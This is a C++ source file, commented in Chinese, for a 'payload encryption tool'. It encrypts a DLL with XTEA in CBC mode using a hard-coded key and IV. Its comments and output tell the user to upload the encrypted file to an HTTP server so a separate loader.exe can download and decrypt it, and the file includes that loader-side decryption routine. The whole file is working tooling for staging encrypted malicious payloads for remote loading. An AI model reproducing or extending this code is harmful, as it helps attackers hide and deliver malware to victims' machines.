// ============================================================
// encrypt.cpp — Payload 加密工具
//
// 用法:
//   encrypt_tool.exe payload.dll payload.dat
//
// 将 payload.dll 用 XTEA 加密后输出为 payload.dat,
// 上传 payload.dat 到 HTTP 服务器供 loader.exe 下载。
// ============================================================

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>

constexpr uint32_t XTEA_DELTA = 0x9E3779B9;
constexpr uint32_t XTEA_KEY[4] = {
    0x7B2E1A4F, 0xC9D83560, 0x4A1F93E7, 0xE8056B2C
};

// XTEA 加密一个 8字节块
void XteaEncryptBlock(uint32_t& v0, uint32_t& v1) {
    uint32_t sum = 0;
    for (int i = 0; i < 32; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + XTEA_KEY[sum & 3]);
        sum += XTEA_DELTA;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + XTEA_KEY[(sum >> 11) & 3]);
    }
}

// XTEA 解密一个 8字节块 (loader 端使用)
void XteaDecryptBlock(uint32_t& v0, uint32_t& v1) {
    uint32_t sum = 0xC6EF3720; // 32 * DELTA
    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + XTEA_KEY[(sum >> 11) & 3]);
        sum -= XTEA_DELTA;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + XTEA_KEY[sum & 3]);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <input.dll> <output.dat>\n", argv[0]);
        printf("Encrypts a DLL payload for remote loading.\n");
        return 1;
    }

    const char* inputPath = argv[1];
    const char* outputPath = argv[2];

    // 读取输入文件
    FILE* fin = fopen(inputPath, "rb");
    if (!fin) {
        printf("[ERROR] Cannot open: %s\n", inputPath);
        return 1;
    }

    fseek(fin, 0, SEEK_END);
    long fileSize = ftell(fin);
    fseek(fin, 0, SEEK_SET);

    if (fileSize <= 0) {
        printf("[ERROR] Empty or invalid file: %s\n", inputPath);
        fclose(fin);
        return 1;
    }

    std::vector<uint8_t> plainData(fileSize);
    fread(plainData.data(), 1, fileSize, fin);
    fclose(fin);

    printf("[INFO] Input file: %s (%ld bytes)\n", inputPath, fileSize);

    // 填充到 8字节对齐 (XTEA 块大小)
    size_t paddedSize = ((fileSize + 7) / 8) * 8;
    std::vector<uint8_t> paddedData(paddedSize, 0);
    memcpy(paddedData.data(), plainData.data(), fileSize);

    // XTEA 加密 (CBC 模式, 简单 IV)
    uint32_t iv0 = 0xDEADBEEF;
    uint32_t iv1 = 0xCAFEBABE;

    auto* blocks = reinterpret_cast<uint32_t*>(paddedData.data());
    size_t numBlocks = paddedSize / 4; // 2个 uint32_t = 1个 XTEA 块

    for (size_t i = 0; i < numBlocks; i += 2) {
        // CBC: XOR with previous ciphertext (or IV for first block)
        blocks[i]   ^= iv0;
        blocks[i+1] ^= iv1;

        XteaEncryptBlock(blocks[i], blocks[i+1]);

        iv0 = blocks[i];
        iv1 = blocks[i+1];
    }

    // 写入输出文件 (前4字节存储原始文件大小, 用于解密时裁剪)
    FILE* fout = fopen(outputPath, "wb");
    if (!fout) {
        printf("[ERROR] Cannot create: %s\n", outputPath);
        return 1;
    }

    uint32_t originalSize = static_cast<uint32_t>(fileSize);
    fwrite(&originalSize, 1, sizeof(originalSize), fout);
    fwrite(paddedData.data(), 1, paddedSize, fout);
    fclose(fout);

    printf("[OK] Encrypted: %s (%zu bytes total)\n",
           outputPath, paddedSize + sizeof(originalSize));
    printf("[INFO] Upload this file to your HTTP server.\n");

    return 0;
}
